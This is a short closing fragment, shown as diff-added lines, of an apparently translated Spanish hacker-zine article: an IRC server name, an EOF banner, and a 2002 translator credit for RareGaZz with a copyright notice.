+-- efnet.vuurwerk.nl
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
+
